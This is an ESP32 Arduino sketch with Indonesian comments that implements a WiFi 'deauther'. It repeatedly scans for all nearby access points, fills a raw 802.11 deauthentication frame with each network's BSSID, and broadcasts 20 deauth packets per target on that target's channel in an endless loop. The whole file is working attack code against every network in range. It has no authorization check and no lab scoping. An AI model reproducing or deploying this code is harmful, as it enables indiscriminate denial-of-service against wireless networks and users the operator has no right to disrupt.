#include <Arduino.h>
#include "esp_wifi.h"
#include <vector>
#include <WiFi.h>

// Struktur Data untuk menyimpan informasi target
struct WiFiTarget {
    uint8_t bssid[6];
    int channel;
    String ssid;
};

std::vector<WiFiTarget> targetList;
enum State { SCANNING, ATTACKING };
State currentState = SCANNING;

// Template Paket Deauth (802.11 Frame)
uint8_t deauthPacket[26] = {
    0xC0, 0x00, 0x3A, 0x01, 
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination (Broadcast)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source (Akan diisi MAC Router)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID (Akan diisi MAC Router)
    0x00, 0x00, 0x07, 0x00              // Reason Code: 7
};

void performScan() {
    Serial.println("\n[SCAN] Mencari target WiFi...");
    targetList.clear();

    int n = WiFi.scanNetworks();
    for (int i = 0; i < n; i++) {
        WiFiTarget t;
        memcpy(t.bssid, WiFi.BSSID(i), 6);
        t.channel = WiFi.channel(i);
        t.ssid = WiFi.SSID(i);
        targetList.push_back(t);
        
        Serial.printf("Ditemukan: %s | Ch: %d | MAC: %s\n", 
                      t.ssid.c_str(), t.channel, WiFi.BSSIDstr(i).c_str());
    }
    
    if (n > 0) currentState = ATTACKING;
}

void attackTarget(WiFiTarget target) {
    // Injeksi MAC Address target ke dalam paket
    for (int i = 0; i < 6; i++) {
        deauthPacket[10 + i] = target.bssid[i];
        deauthPacket[16 + i] = target.bssid[i];
    }

    esp_wifi_set_channel(target.channel, WIFI_SECOND_CHAN_NONE);
    
    // Kirim paket deauth sebanyak 20 kali per target
    for (int i = 0; i < 20; i++) {
        esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), false);
        delay(1); 
    }
    Serial.printf("[ATTACK] Menyerang %s di Channel %d\n", target.ssid.c_str(), target.channel);
}

void setup() {
    Serial.begin(115200);
    
    // Low-level WiFi Init
    esp_netif_init();
    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    esp_wifi_init(&cfg);
    esp_wifi_set_storage(WIFI_STORAGE_RAM);
    esp_wifi_set_mode(WIFI_MODE_STA);
    esp_wifi_start();
    
    Serial.println("System Architect Deauther Ready.");
}

void loop() {
    if (currentState == SCANNING) {
        performScan();
    } 
    else if (currentState == ATTACKING) {
        for (auto const& target : targetList) {
            attackTarget(target);
            delay(500); // Jeda antar target agar tidak crash
        }
        // Setelah satu putaran serangan, scan lagi untuk update target
        currentState = SCANNING;
    }
}